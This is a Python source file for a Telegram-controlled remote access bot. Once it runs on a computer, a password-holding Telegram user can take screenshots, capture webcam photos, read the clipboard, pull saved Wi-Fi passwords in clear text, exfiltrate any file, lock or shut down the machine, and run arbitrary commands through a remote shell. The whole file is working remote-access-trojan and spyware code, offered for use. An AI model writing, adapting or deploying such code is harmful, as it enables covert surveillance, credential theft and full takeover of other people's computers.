import os
import re
import mss
import cv2
import time
import shutil
import telebot
import platform
import subprocess
import pyAesCrypt
import threading
import requests
import pyperclip
from gtts import gTTS
from io import BytesIO
from pathlib import Path
from functools import wraps
from tempfile import NamedTemporaryFile

# ==============================
# CONFIGURATION
# ==============================

TOKEN = "PUT_YOUR_BOT_TOKEN_HERE"
BOT_PASSWORD = "PUT_YOUR_PASSWORD_HERE"

bot = telebot.TeleBot(TOKEN)
OS = platform.system()  # 'Windows', 'Linux', 'Darwin'
cd = Path.home()

authenticated_users = set()
user_states = {}

STATE_NORMAL = 1
STATE_SHELL = 2

# ==============================
# HELPERS
# ==============================

def is_authenticated(user_id):
    return user_id in authenticated_users


def authenticate_required(func):
    @wraps(func)
    def wrapper(message, *args, **kwargs):
        if not is_authenticated(message.from_user.id):
            bot.send_message(message.chat.id, "Please authenticate with /auth [password]")
            return
        return func(message, *args, **kwargs)
    return wrapper


def send_long_message(chat_id, text):
    chunk_size = 4000
    for i in range(0, len(text), chunk_size):
        bot.send_message(chat_id, text[i:i + chunk_size])


def secure_delete_fallback(path: Path, passes=2):
    try:
        if not path.exists() or not path.is_file():
            return False
        length = path.stat().st_size
        with open(path, "r+b") as f:
            for _ in range(passes):
                f.seek(0)
                f.write(os.urandom(length))
                f.flush()
                os.fsync(f.fileno())
        path.unlink()
        return True
    except Exception:
        try:
            path.unlink()
        except:
            return False
    return True


# ==============================
# SYSTEM FUNCTIONS
# ==============================

def get_public_ip():
    try:
        r = requests.get("https://api.ipify.org")
        return r.text.strip()
    except:
        return "Error retrieving IP."


def get_system_info():
    info = {
        "OS": platform.system(),
        "Version": platform.version(),
        "Release": platform.release(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "CPU cores": os.cpu_count(),
        "Username": os.getenv("USER") or os.getenv("USERNAME"),
    }
    return "\n".join(f"{k}: {v}" for k, v in info.items())


def take_screenshot(path: Path):
    with mss.mss() as sct:
        sct.shot(output=str(path))
    return path


def capture_webcam_image(path: Path):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return None
    ret, frame = cap.read()
    cap.release()
    if ret:
        cv2.imwrite(str(path), frame)
        return path
    return None


def lock_screen():
    try:
        if OS == "Windows":
            subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"])
        elif OS == "Darwin":
            subprocess.run(["/System/Library/CoreServices/Menu Extras/User.menu/Contents/Resources/CGSession", "-suspend"])
        elif OS == "Linux":
            if shutil.which("loginctl"):
                subprocess.run(["loginctl", "lock-session"])
            elif shutil.which("gnome-screensaver-command"):
                subprocess.run(["gnome-screensaver-command", "-l"])
            else:
                return False
        return True
    except Exception:
        return False


def shutdown_computer():
    try:
        if OS == "Windows":
            subprocess.run(["shutdown", "/s", "/t", "5"])
        elif OS == "Linux":
            subprocess.run(["systemctl", "poweroff"])
        elif OS == "Darwin":
            subprocess.run(["osascript", "-e", 'tell app "System Events" to shut down'])
        return True
    except Exception:
        return False


def get_clipboard_content():
    try:
        return pyperclip.paste()
    except:
        return None


def play_text(text, lang="en"):
    tts = gTTS(text=text, lang=lang)
    with NamedTemporaryFile(suffix=".mp3", delete=False) as tmp:
        tts.write_to_fp(tmp)
        tmp_path = tmp.name
    if OS == "Windows":
        subprocess.run(["start", tmp_path], shell=True)
    elif OS == "Darwin":
        subprocess.run(["open", tmp_path])
    else:
        subprocess.run(["xdg-open", tmp_path])


def get_wifi_passwords():
    profiles = []
    try:
        if OS == "Windows":
            export_folder = Path.home() / "wifi_profiles"
            export_folder.mkdir(exist_ok=True)
            subprocess.run(["netsh", "wlan", "export", "profile", "key=clear", f"folder={export_folder}"], shell=True)
            for file in export_folder.glob("*.xml"):
                xml_content = file.read_text(errors="ignore")
                ssid = re.search(r"<name>(.*?)</name>", xml_content)
                key = re.search(r"<keyMaterial>(.*?)</keyMaterial>", xml_content)
                if ssid:
                    profiles.append(f"SSID: {ssid.group(1)} | PASS: {key.group(1) if key else 'N/A'}")
            shutil.rmtree(export_folder)
        elif OS == "Darwin":
            # macOS version
            result = subprocess.run(["security", "find-generic-password", "-ga", "Wi-Fi"], capture_output=True, text=True)
            profiles.append(result.stdout)
        elif OS == "Linux":
            result = subprocess.run(["nmcli", "-t", "-f", "NAME,SECURITY", "connection", "show"], capture_output=True, text=True)
            profiles.append(result.stdout)
    except Exception as e:
        profiles.append(f"Error: {e}")
    return "\n".join(profiles) if profiles else "No Wi-Fi profiles found or permission denied."


# ==============================
# BOT COMMANDS
# ==============================

@bot.message_handler(commands=["auth"])
def authenticate(message):
    user_id = message.from_user.id
    parts = message.text.split()
    if len(parts) != 2:
        bot.send_message(user_id, "Usage: /auth [password]")
        return
    if parts[1] == BOT_PASSWORD:
        authenticated_users.add(user_id)
        bot.send_message(user_id, "✅ Authenticated successfully.")
    else:
        bot.send_message(user_id, "❌ Wrong password.")


@bot.message_handler(commands=["start"])
@authenticate_required
def start(message):
    bot.send_message(
        message.chat.id,
        "Commands:\n"
        "/screen - screenshot\n"
        "/sys - system info\n"
        "/ip - public IP\n"
        "/cd [dir] - change folder\n"
        "/ls - list files\n"
        "/upload [path] - get file\n"
        "/clipboard - get clipboard\n"
        "/speech [text] - play speech\n"
        "/wifi - get Wi-Fi info\n"
        "/lock - lock PC\n"
        "/shutdown - shutdown PC\n"
        "/shell - open remote shell\n"
        "/webcam - capture webcam"
    )


@bot.message_handler(commands=["screen"])
@authenticate_required
def screenshot_cmd(message):
    path = cd / "screenshot.png"
    take_screenshot(path)
    with open(path, "rb") as f:
        bot.send_photo(message.chat.id, f)
    path.unlink(missing_ok=True)


@bot.message_handler(commands=["sys"])
@authenticate_required
def sys_info_cmd(message):
    bot.send_message(message.chat.id, get_system_info())


@bot.message_handler(commands=["ip"])
@authenticate_required
def ip_cmd(message):
    bot.send_message(message.chat.id, get_public_ip())


@bot.message_handler(commands=["ls"])
@authenticate_required
def list_dir_cmd(message):
    try:
        contents = [p.name for p in cd.iterdir()]
        bot.send_message(message.chat.id, "\n".join(contents) or "Empty folder.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")


@bot.message_handler(commands=["cd"])
@authenticate_required
def cd_cmd(message):
    global cd
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.send_message(message.chat.id, f"Current dir: {cd}")
        return
    new_path = (cd / args[1]).resolve()
    if new_path.is_dir():
        cd = new_path
        bot.send_message(message.chat.id, f"Changed to: {cd}")
    else:
        bot.send_message(message.chat.id, "Folder not found.")


@bot.message_handler(commands=["upload"])
@authenticate_required
def upload_cmd(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        bot.send_message(message.chat.id, "Usage: /upload [path]")
        return
    path = Path(args[1])
    if path.exists() and path.is_file():
        with open(path, "rb") as f:
            bot.send_document(message.chat.id, f)
    else:
        bot.send_message(message.chat.id, "File not found.")


@bot.message_handler(commands=["clipboard"])
@authenticate_required
def clipboard_cmd(message):
    clip = get_clipboard_content()
    bot.send_message(message.chat.id, clip or "Clipboard empty or unsupported.")


@bot.message_handler(commands=["speech"])
@authenticate_required
def speech_cmd(message):
    text = message.text.replace("/speech", "").strip()
    if not text:
        bot.send_message(message.chat.id, "Usage: /speech [text]")
        return
    threading.Thread(target=play_text, args=(text,), daemon=True).start()
    bot.send_message(message.chat.id, "Speaking... 🎤")


@bot.message_handler(commands=["lock"])
@authenticate_required
def lock_cmd(message):
    if lock_screen():
        bot.send_message(message.chat.id, "🔒 Screen locked.")
    else:
        bot.send_message(message.chat.id, "❌ Lock not supported on this OS.")


@bot.message_handler(commands=["shutdown"])
@authenticate_required
def shutdown_cmd(message):
    if shutdown_computer():
        bot.send_message(message.chat.id, "💻 Shutting down...")
    else:
        bot.send_message(message.chat.id, "❌ Shutdown failed or unsupported.")


@bot.message_handler(commands=["webcam"])
@authenticate_required
def webcam_cmd(message):
    img = cd / "webcam.jpg"
    result = capture_webcam_image(img)
    if result:
        with open(result, "rb") as f:
            bot.send_photo(message.chat.id, f)
        img.unlink(missing_ok=True)
    else:
        bot.send_message(message.chat.id, "Camera not found.")


@bot.message_handler(commands=["wifi"])
@authenticate_required
def wifi_cmd(message):
    bot.send_message(message.chat.id, get_wifi_passwords())


@bot.message_handler(commands=["shell"])
@authenticate_required
def shell_cmd(message):
    user_states[message.from_user.id] = STATE_SHELL
    bot.send_message(message.chat.id, "Shell mode active. Type 'exit' to quit.")


def get_user_state(uid):
    return user_states.get(uid, STATE_NORMAL)


@bot.message_handler(func=lambda msg: get_user_state(msg.from_user.id) == STATE_SHELL)
@authenticate_required
def shell_input(message):
    uid = message.from_user.id
    cmd = message.text.strip()
    if cmd.lower() == "exit":
        user_states[uid] = STATE_NORMAL
        bot.send_message(uid, "Exited shell mode.")
        return
    try:
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = proc.communicate(timeout=30)
        text = (out or b"").decode(errors="ignore") + (err or b"").decode(errors="ignore")
        send_long_message(uid, text or "[No output]")
    except Exception as e:
        bot.send_message(uid, f"Error: {e}")


# ==============================
# MAIN LOOP
# ==============================

if __name__ == "__main__":
    print(f"Bot running on {OS} ...")
    while True:
        try:
            bot.infinity_polling()
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
